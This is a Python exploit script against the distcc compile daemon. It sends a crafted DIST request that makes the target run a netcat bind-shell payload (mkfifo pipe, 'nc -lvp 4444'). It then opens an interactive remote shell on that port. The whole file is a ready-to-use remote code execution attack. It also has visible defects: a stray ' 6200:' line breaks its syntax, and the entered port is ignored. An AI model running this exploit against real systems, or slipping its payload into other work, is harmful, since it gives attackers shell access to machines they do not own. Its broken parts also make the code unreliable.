#!/usr/bin/python3

import socket
import os
import random
import string
import select
from sys import argv



def random_text(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_payload(bind_port, shell_path="/bin/bash"):
    # Creating reverse shell payload
    backpipe = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
    payload = (
        f"mkfifo /tmp/{backpipe}; "
        f"cat /tmp/{backpipe} | {shell_path} -i 2>&1 | "
        f"nc -lvp {bind_port} >/tmp/{backpipe} & "
        f"rm /tmp/{backpipe}"
    )
    return payload

def exploit(target_ip, payload, distcc_port=3632):
    try:
        print("[+] Connecting to target...")
        distcc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        distcc_socket.connect((target_ip, distcc_port))

        distcmd = generate_cmd("sh", "-c", payload)
        distcc_socket.send(distcmd.encode())

        dtag = random_text(10)
        msg = ('DOTI0000000A' + dtag + '\n')
        distcc_socket.send(msg.encode())

        print("[+] Payload sent successfully. Connecting to the shell...")
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

def generate_cmd(*args):
    cmd = list(args) + ['#', '-c', 'main.c', '-o', 'main.o']
    request = 'DIST00000001' + 'ARGC' + str(len(cmd)).zfill(8)

    for c in cmd:
        request += 'ARGV' + "{0:0{1}x}".format(len(c), 8) + c

    return request

def interact_with_shell(target_ip, bind_port):
    try:
        print(f"[+] Connecting to {target_ip}:{bind_port} for interactive shell...")
        sock = socket.create_connection((target_ip, bind_port))
        print("[+] Connected to the target. Type your commands below.\n")

        # Perform a small read initially to handle the prompt
        initial_response = sock.recv(4096).decode(errors="ignore")
        print(initial_response, end="")

        while True:
            # Get command from the user
            cmd = input("$ ")
            if cmd.lower() == "exit":
                print("[+] Exiting shell.")
                break

            # Send the command with a newline at the end
            sock.sendall((cmd + "\n").encode())

            # Read the response and wait for prompt
            response = b""
            while True:
                chunk = sock.recv(4096)  # Read incoming data
                response += chunk
                if b"$ " in chunk or b"# " in chunk:  # Exit when the prompt is found
                    break

            # Print the response
            print(response.decode(errors="ignore"), end="")

        sock.close()
    except Exception as e:
        print(f"[-] Failed to interact with the shell: {e}")
 6200:
if __name__ == "__main__":
    
    bind_port = 4444  # Fixing the port to be used on the target
    target_ip = input("Enter the target IP: ")
    distcc_port = input("Enter target port (default 3632):")
    
    # Create the payload
    malicious_payload = generate_payload(bind_port)

    # Run the exploit
    exploit(target_ip, malicious_payload)

    # Interact with the shell
    interact_with_shell(target_ip, bind_port)
